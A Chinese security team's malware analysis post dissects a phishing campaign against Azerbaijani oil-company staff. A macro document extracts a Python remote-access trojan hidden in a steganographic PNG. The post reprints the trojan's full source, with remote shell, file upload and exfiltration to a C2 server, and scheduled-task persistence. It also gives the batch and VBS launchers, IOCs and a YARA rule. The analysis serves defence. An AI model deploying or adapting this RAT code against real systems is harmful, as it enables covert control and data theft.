# 使用图片隐写的Python远控恶意样本分析

<a id="copyright_logo"></a>Original thanks <a id="profileBt"></a><a id="js_name"></a>ChaMd5安全团队 *2022-05-02 07:50* *Posted on <a id="js_ip_wording"></a>辽宁*

<a id="js_article-tag-card__left"></a>收录于合集 #病毒分析 <a id="js_article-tag-card__right"></a>36个

## 前言:

通过钓鱼邮件传播恶意文档,将payload以压缩包形式利用图片隐写存放在文档资源图片中,以规避杀软达到免杀效果,平常接触到的python远控比较少,使用脚本语言编写远控基本上就等于是暴露源码,且此样本python远控部分没有使用任何代码混淆,功能也有待完善,仅具备一般远控的上传,下载和命令执行等功能

## 样本详细分析:

### 一. doc宏文档:

#### 投递手法:

最初的攻击载荷为一个具有恶意宏代码的doc文档,利用模糊效果和提示信息的手段,诱骗目标启用宏,所使用的语言是阿塞拜疆语,文件以SOCAR名义发出,SOCAR是阿塞拜疆共和国国家石油公司的简称,其针对的目标群体为阿塞拜疆共和国国家石油公司员工,文件的创建时间是在2021.3.28,与文档中文件签署的时间相近,根据日期推测发起定向钓鱼行动日期就在2021年3月末![Image](../../../_resources/640_wx_fmt_png_wxfrom_5_wx_lazy__09fae05461364c29a.png)![Image](../../../_resources/640_wx_fmt_png_wxfrom_5_wx_lazy__5961e87ce49d4d7f8.png)

#### 解密函数:

宏代码存在混淆,大量使用自定义的变量和函数,但是整体的加密手法比较单一,统一都是使用函数`MyFu_RXQYE_20210329_092748_rqxjx_nc23`去处理传入的加密的数字串,其解密逻辑为:从传入的参数中依次取出四位数,然后使用自己编写的swich语句解密<img width="677" height="184" src="../../../_resources/640_wx_fmt_png_wxfrom_5_wx_lazy__fe5a134ed78c4c46b.png"/>原解密函数:

```
`Private Function MyFu_RXQYE_20210329_092748_rqxjx_nc23(ByVal inputVal As String) As String
    Dim i As Long
    Dim a As String
    Dim midaaa As String
    For i = 1 To Len(inputVal) Step 4
    midaaa = Mid$(inputVal, i, 4)
    a = Custom15_RXQYE_20210329_092748_rqxjx_47Convw32(midaaa)
    MyFu_RXQYE_20210329_092748_rqxjx_nc23 = MyFu_RXQYE_20210329_092748_rqxjx_nc23 & a
    Next i
End Function
`
```

可以根据原逻辑编写对应的python脚本解密

```
`def SwichNum(key):
    if key =="6628":
        res = " "
 ...
    ...
    elif key =="7380":
        res = "~"
        return res;
    
    a = ""
    i = 0
    inputVal = "7300724472686740734872127268"
    for x in range(len(inputVal)//4):
        res = ""
        a += SwichNum(inputVal[i:i+4])
        i+=4
print(a);
`
```

经解密刚开始被定义的六个路径解密完以后分别为:

```
`"C:\Users\Admin\AppData\Local\Temp\tmp.zip"
"C:\Users\Admin\AppData\Roaming\nettools48\runner.bat"
"C:\Users\Admin\AppData\Local\Temp\aurora5613"
"C:\Users\Admin\AppData\Local\Temp\aurora8644.docx"
"C:\Users\Admin\AppData\Local\Temp\aurora7816.zip"
"C:\Users\Admin\AppData\Roaming\nettools48\"
`
```

#### 恶意宏整体执行流程:

调试跟踪后发现其宏代码主要目的为解压提取出后续的远控源码并且执行远控脚本:

1.  创建空文件夹`"C:\Users\Admin\AppData\Roaming\nettools48\"`
    
2.  使用写好的函数SaveAsDocx将自身从doc文档转成docx格式保存在temp目录下`aurora3121.docx`
    
3.  然后是将docx的文档复制一份,后缀改成zip`aurora2292.zip`(docx格式的文件格式本质上都是压缩包)
    
4.  创建空文件夹`"C:\Users\Admin\AppData\Local\Temp\aurora553"`
    
5.  然后使用写好的函数unzip将`aurora2292.zip`解压到在temp目录下创建的`aurora553`文件夹下
    
6.  然后进入指定路径,从加载的图片里提取出嵌入的`tmp.zip`文件
    
7.  然后将提取出来的`tmp.zip`文件解压到刚才创建的AppData下的`nettools48`文件夹下
    
8.  最后运行`nettools48`文件夹下的`runner.bat`
    

<img width="677" height="305" src="../../../_resources/640_wx_fmt_jpeg_wxfrom_5_wx_lazy_a75c04648a914199b.jpg"/>

#### png图片隐写zip文件

补充知识点:<img width="677" height="484" src="../../../_resources/640_wx_fmt_png_wxfrom_5_wx_lazy__a9c39b8594b14494a.png"/>

> PNG文件头 开头固定8个字节`89 50 4E 47 0D 0A 1A 0A`为PNG的文件头 第8位开始固定4个字节`00 00 00 0D`代表数据块的长度为13 第c位开始固定4个字节`49 48 44 52`是文件头数据块的标示(IDCH) 第10到17位,前4个字节代表该图片的宽,后4个字节代表该图片的高 第1d到20位,四字节为该png的CRC检验码,是由从IDCH到IHDR的十七位字节进行crc计算得到

样本通过遍历查找经过图片隐写后png文件的标识头`puNk`,然后将此段数据块的zip文件保存在appdata目录下<img width="677" height="165" src="../../../_resources/640_wx_fmt_png_wxfrom_5_wx_lazy__353ffb1dcdaa43718.png"/><img width="677" height="495" src="../../../_resources/640_wx_fmt_png_wxfrom_5_wx_lazy__69ad29beba414dd58.png"/>查看其压缩包解压出来的文件夹,包含了很多python运行需要的组件,包含了Python 3.6解释器,NetTools Python库,Python远控脚本,RAT C2配置和runner.bat<img width="677" height="360" src="../../../_resources/640_wx_fmt_png_wxfrom_5_wx_lazy__47ee7ef53d2e4b3f8.png"/>

#### 执行批处理脚本加载python远控

在关闭文档的时候会自动执行循环100次垃圾指令绕过杀软检测,nettools48目录下的批处理脚本runner.bat,用于执行后续的python远控vabsheche.py<img width="677" height="137" src="../../../_resources/640_wx_fmt_png_wxfrom_5_wx_lazy__b076e5b132f442fb8.png"/>

```
`SET /A num=%RANDOM% * (80 - 60 + 1) / 32768 + 60
timeout /t %num%
set DIR=%~dp0
"%DIR%\python" "%DIR%\vabsheche.py"
`
```

### 二. python远控

整体的python代码没有经过混淆,并且代码量比较简短,在开头判断系统是Windows,Linux还是Mac OS,根据系统类型执行对应操作,但是后续的代码中只有windows的操作,猜测其后续变种可能会完善其他平台功能 整体python远控分为两个部分:

#### 1\. 持久化:

先执行findstr命令去搜索一下是否存在"paurora"字段开头的计划任务,如果存在则代表当前主机已被感染,则跳过持久化这一步,如不存在则将当前目录文bg.txt中的`"$runnerPath$"`字段替换成`"runner.bat"`的绝对路径,然后创建写入到脚本`bg.vbs`,以创建计划任务方式将vbs脚本设置成计划任务,全天启动,计划任务名字为"paurora" 加上随机0~10000后缀 bg.vbs脚本用于启动runner.bat调用vabsheche.py远控程序

```
`subprocess.run(['schtasks', '/create', '/sc', 'DAILY', '/tn', task_name,'/tr', "wscript '{}'".format(vbs_path), '/st', '00:01','/ri', '30', '/du', '24:00'])
`
```

```
`CreateObject("Wscript.Shell").Run """C:\Users\Admin\AppData\Roaming\nettools48/runner.bat""", 0, True
`
```

#### 2\. 远控通信:

`socket.socket(socket.AF_INET, socket.SOCK_STREAM)`,`ssl.wrap_socket()` 样本获取当前路径下的"notes.txt"得到通信的c2和端口,使用ssl+socket进行网络通信,并且SSLSocket通过加载发送当前目录下的cert.pem证书文件,确保连接的真实性![Image](../../../_resources/640_wx_fmt_png_wxfrom_5_wx_lazy__a075d07c5d524802a.png)![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)连接上服务端之后,支持执行的命令有:

| "HEARTH_BEAT": | 向服务器发送"None"表示当前存活状态 |
| --- | --- |
| "USER_INFO": | 收集信息,包括操作系统名称,版本和用户名 |
| "SHELL": | cmd执行从服务器端接收到的指令,并且返回结果 |
| "PREPARE_UPLOAD": | 检测文件是否可读写,判断成功会向服务器发送"ready" |
| "UPLOAD": | 从c2服务器接收数据,并将其写入至文件 |
| "DOWNLOAD": | 将文件目标通过zip格式发送到c2 |

#### 源码:

```
`import getpass
import json
import os
import platform
import socket
import ssl
import subprocess
import time
import traceback
import zipfile
from random import randint
from threading import Thread
def win_client():
    if 'win' in platform.system().lower():
        return True
    return False
def linux_client():
    if 'linux' in platform.system().lower():
        return True
    return False
def osx_client():
    if 'darwin' in platform.system().lower():
        return True
    return False
CURRENT_FILE_DIRECTORY = os.path.dirname(os.path.realpath(__file__)) + "/"
with open(CURRENT_FILE_DIRECTORY + "notes.txt", 'r') as f:
    notes = [line.rstrip() for line in f]
HOST = notes[0]
PORT = int(notes[1])
if win_client():
    tmp_dir = 'C:/Windows/Temp/'
else:
    tmp_dir = '/tmp/'
def task_registration():
    time.sleep(5)
    runner_path = CURRENT_FILE_DIRECTORY + "runner.bat"
    vbs_path = CURRENT_FILE_DIRECTORY + "bg.vbs"
    task_query_result = subprocess.run(['schtasks', '/query'], stdout=subprocess.PIPE)
    task_find_result = subprocess.run(['findstr', 'paurora*'], input=task_query_result.stdout, stdout=subprocess.PIPE)
    if task_find_result.stdout.decode().strip() == "":
        with open(CURRENT_FILE_DIRECTORY + "bg.txt", 'r') as file:
            content = file.read()
            content = content.replace("$runnerPath$", runner_path)
        with open(vbs_path, "w") as text_file:
            text_file.write(content)
        task_name = "paurora" + str(randint(0, 10000))
        subprocess.run(['schtasks', '/create', '/sc', 'DAILY', '/tn', task_name,
                        '/tr', "wscript '{}'".format(vbs_path), '/st', '00:01',
                        '/ri', '30', '/du', '24:00'])
if win_client():
    taskThread = Thread(target=task_registration)
    taskThread.start()
def mp_recvall_buffer(client, buf: bytearray, count):
    view = memoryview(buf)
    while count:
        read_bytes = client.recv_into(view, count)
        if read_bytes == 0:
            raise Exception("Connection closed")
        view = view[read_bytes:]
        count -= read_bytes
def mp_recvall(client, count: int):
    buf = bytearray(count)
    mp_recvall_buffer(client, buf, len(buf))
    return buf
def mp_receive_message(client):
    message_id = mp_receive_long(client)
    message_len = int.from_bytes(mp_recvall(client, 4), byteorder='big')
    message = mp_recvall(client, message_len)
    message = message.decode()
    message = deserialize_json(message)
    return {'id': message_id, 'message': message}
def mp_receive_long(client):
    return int.from_bytes(mp_recvall(client, 8), byteorder='big')
def mp_send_message(client, message_id, message):
    message_json = serialize_json(message)
    message_json = message_json.encode()
    message_id_bytes = int.to_bytes(message_id, 8, byteorder='big')
    message_len = len(message_json)
    message_len_bytes = int.to_bytes(message_len, 4, byteorder='big')
    client.sendall(message_id_bytes)
    client.sendall(message_len_bytes)
    client.sendall(message_json)
def run_command(command):
    process = subprocess.Popen(["cmd.exe", "/K", "chcp", "65001"], shell=True, stdout=subprocess.PIPE,
                               stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    command = command + '\n'
    stdout_data = process.communicate(input=command.encode())
    subp_output = stdout_data[0].decode()
    errors = stdout_data[1].decode()
    return {"output": subp_output, "error": errors, "location": os.path.abspath(os.curdir)}
def zip_folder(foldername, target_dir):
    zipobj = zipfile.ZipFile(foldername, 'w', zipfile.ZIP_DEFLATED)
    for root, dirs, files in os.walk(target_dir):
        for file in files:
            subfolder_name = os.path.relpath(root, target_dir)
            fn = os.path.join(root, file)
            if subfolder_name == '.':
                zipobj.write(fn, file)
            else:
                zipobj.write(fn, os.path.join(subfolder_name, file))
def mp_change_dir(path):
    if os.path.exists(path):
        if os.path.isdir(path):
            os.chdir(path)
            return {"output": "", "error": "", "location": os.path.abspath(os.curdir)}
        else:
            return {"output": "", "error": "Is not a dir", "location": os.path.abspath(os.curdir)}
    else:
        return {"output": "", "error": "No dir", "location": os.path.abspath(os.curdir)}
def mp_download(path, offset):
    if os.path.isfile(path):
        send_file(path, offset)
    elif os.path.isdir(path):
        file_name = '{}.zip'.format(time.strftime("%Y%m%d_%H%M%S"))
        tmp_zip_file_path = '{}{}'.format(tmp_dir, file_name)
        zip_folder(tmp_zip_file_path, path)
        send_file(tmp_zip_file_path, offset)
        os.remove(tmp_zip_file_path)
    else:
        response = {"@type": "simpleResponse", 'content': "File does not exists"}
        mp_send_message(secure_server_conn, message_id, response)
def mp_prepare_upload(destination_path):
    try:
        with open(destination_path, "wb"):
            response = {"@type": "simpleResponse", 'content': "ready"}
            mp_send_message(secure_server_conn, message_id, response)
    except Exception as e:
        traceback.print_exc()
        error_message = str(e)
        response = {"@type": "simpleResponse", 'content': error_message}
        mp_send_message(secure_server_conn, message_id, response)
def mp_upload(destination_path):
    buffer = bytearray(1024 * 1024)
    file_size = mp_receive_long(secure_server_conn)
    try:
        with open(destination_path, "wb") as file:
            response = {"@type": "responseFollowingBytes", 'content': "success"}
            mp_send_message(secure_server_conn, message_id, response)
            bytes_len = int.to_bytes(100, 8, byteorder='big')
            secure_server_conn.sendall(bytes_len)
            last_progress = 0
            remaining = file_size
            while remaining != 0:
                bytes_to_read = min(len(buffer), remaining)
                mp_recvall_buffer(secure_server_conn, buffer, bytes_to_read)
                remaining -= bytes_to_read
                file_write_view = memoryview(buffer)
                file_write_view = file_write_view[0:bytes_to_read]
                file.write(file_write_view)
                progress = (file_size - remaining) / file_size
                diff = progress - last_progress
                if diff > 0.01:
                    last_percent = int(last_progress * 100)
                    percent = int(progress * 100)
                    percents = range(last_percent + 1, percent + 1)
                    secure_server_conn.sendall(bytearray(percents))
                    last_progress = progress
            if last_progress != 1.0:
                secure_server_conn.sendall(bytearray([100]))
    except Exception as e:
        traceback.print_exc()
        error_message = str(e)
        response = {"@type": "simpleResponse", 'content': error_message}
        mp_send_message(secure_server_conn, message_id, response)
def send_file(path, offset):
    remaining = os.path.getsize(path) - offset
    chunk_size = 1024 * 1024
    try:
        with open(path, "rb") as f:
            f.seek(offset, 1)
            response = {"@type": "responseFollowingBytes", 'content': "exists"}
            mp_send_message(secure_server_conn, message_id, response)
            bytes_len = int.to_bytes(remaining, 8, byteorder='big')
            secure_server_conn.sendall(bytes_len)
            while remaining != 0:
                bytes = f.read(min(chunk_size, remaining))
                secure_server_conn.sendall(bytes)
                remaining -= len(bytes)
    except Exception as e:
        error = str(e)
        response = {"@type": "simpleResponse", 'content': error}
        mp_send_message(secure_server_conn, message_id, response)
def serialize_json(object):
    return json.dumps(object)
def deserialize_json(jsonStr):
    return json.loads(jsonStr)
def get_user_info():
    os_name = str(platform.system())
    os_version = str(platform.release())
    uname = str(getpass.getuser())
    return {"osName": os_name, "osVersion": os_version, "username": uname, "appVersion": {"version": "0.0.0"}}
while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_conn:
            with ssl.wrap_socket(server_conn, certfile=CURRENT_FILE_DIRECTORY + "cert.pem", ) as secure_server_conn:
                secure_server_conn.connect((HOST, PORT))
                message = {'type': 'CONNECTION_TYPE', 'content': ["core.managment.ConnectionType", 'PRIMARY'],
                           "@type": "simpleRequest", }
                mp_send_message(secure_server_conn, 32513612, message)
                print("[*] Coooooonnnnnnnected tooooooo sssssssssseerrrvveeeeerr aAaatTt {}:{}".format(HOST, PORT))
                while True:
                        msg = mp_receive_message(client=secure_server_conn)
                        message_id = msg['id']
                        message = msg['message']
                        message_type = message['type']
                        content = message['content']
                        if message_type == "OPEN_NEW_CONNECTION":
                            response = {"@type": "simpleResponse", 'content': False}
                            mp_send_message(secure_server_conn, message_id, response)
                        if message_type == "HEARTH_BEAT":
                            response = {"@type": "simpleResponse", 'content': None}
                            mp_send_message(secure_server_conn, message_id, response)
                        elif message_type == "USER_INFO":
                            response = get_user_info()
                            response = {"@type": "simpleResponse", 'content': ["core.managment.UserInfo", response]}
                            mp_send_message(secure_server_conn, message_id, response)
                        elif message_type == "SHELL":
                            command = content['command']
                            if command.startswith('cd'):
                                path = command[2:].strip()
                                response = mp_change_dir(path)
                            else:
                                response = run_command(command)
                            response = {"@type": "simpleResponse",
                                        'content': ["core.managment.ShellCommandResult", response]}
                            mp_send_message(secure_server_conn, message_id, response)
                        elif message_type == "PREPARE_UPLOAD":
                            destinationPath = content
                            mp_prepare_upload(destinationPath)
                        elif message_type == "UPLOAD":
                            destinationPath = content
                            mp_upload(destinationPath)
                        elif message_type == "DOWNLOAD":
                            destinationPath = content['path']
                            offset = content['offset']
                            mp_download(destinationPath, offset)
    except Exception as e:
        traceback.print_exc()
        print("[-] CaaaaAaAaaannnn't rreeeaaaaccccch tTtTtttHHhhhhe ssSssSsssEEEsseRRrrrrvvvveEErrr...")
        time.sleep(120)
`
```

## 关联分析:

通过搜索其使用的服务器ip地址信息,可以关联到此次其他样本,根据发现的开源分析报告和对比样本的编译时间可以判断该样本是此次攻击活动同一批的攻击样本![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)同样是利用钓鱼文档,运用了相同的隐写方法然后解压出远控,隐写的名称也是相同的"puNK"字段,不同的是,此样本后续的Rat是c#开发<img width="677" height="441" src="../../../_resources/640_wx_fmt_png_wxfrom_5_wx_lazy__e01588a690d048af8.png"/>

## iocs:

| name | md5 |
| --- | --- |
| 42f5f5474431738f91f612d9765b3fc9b85a547274ea64aa034298ad97ad28f4.doc | fe185f106730583156f39233f77f8019 |
|     |     |
| ef02527858797356c5e8571c5a22d00c481fbc9ce73c81a341d482ea3776878a.doc | ef02527858797356c5e8571c5a22d00c481fbc9ce73c81a341d482ea3776878a |
| c2  | ip  |
| pook.mywire.org | 111.90.150.37 |

## 检测规则:

```
`rule Microsoft_Excel_Hidden_Macrosheet
{
 meta:
  author = "gongyouxiu"
 strings:
  $doc={D0 CF 11 E0 A1 B1 1A E1}
    $zip = {70 75 4E 6B 50 4B}
    $ssl = {63 65 72 74 2E 70 65 6D}
    $document_open = "Document_Open" fullword ascii
  $document_Close = "Document_Close" fullword ascii
 condition:
  all of them
}
`
```

## 总结:

多处细节规避杀软检测:

1.  宏代码中多处输出垃圾指令和延迟执行
    
2.  将执行文件的代码部分放在了`Document_Close`中
    
3.  图片隐写存放远控资源
    

后续python远控也存在着混淆的可能性,待功能完善技术升级,攻击者可能会重新发起新的行动

## 参考:

将Python远控隐藏在文档图片中的行动分析 简单理解socket(socket.AF\_INET,socket.SOCK\_STRE,os.dup2) Aurora恶意活动分析：针对阿塞拜疆的网络攻击使用了多种RAT

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org

<img width="677" height="348" src="../../../_resources/640_wx_fmt_jpeg_wxfrom_5_wx_lazy_e802da56bfe54d15b.jpg"/>

收录于合集 #<a id="js_album_keep_read_title"></a>病毒分析

 <a id="js_album_keep_read_size"></a>36个

<a id="js_album_prev"></a>上一篇 <a id="js_album_keep_read_pre_title"></a>fodcha 僵尸网络病毒分析 <a id="js_album_next"></a>下一篇 <a id="js_album_keep_read_next_title"></a>XHtmlTreeTest中的木马dll分析

People who liked this content also liked

python免杀---进化史

...

广软NSDA安全团队

不看的原因

- 内容质量低
- 不看此公众号

如何通过 Git 和 Husky 添加提交钩子并实现代码任务自动化

...

前端下午茶

不看的原因

- 内容质量低
- 不看此公众号

用Python去除图片背景：​Rembg库

...

Python大数据分析

不看的原因

- 内容质量低
- 不看此公众号

<img width="102" height="102" src="../../../_resources/qrcode_scene_10000004_size_102___6dcb294ecd614b56b.bmp"/>

Scan to Follow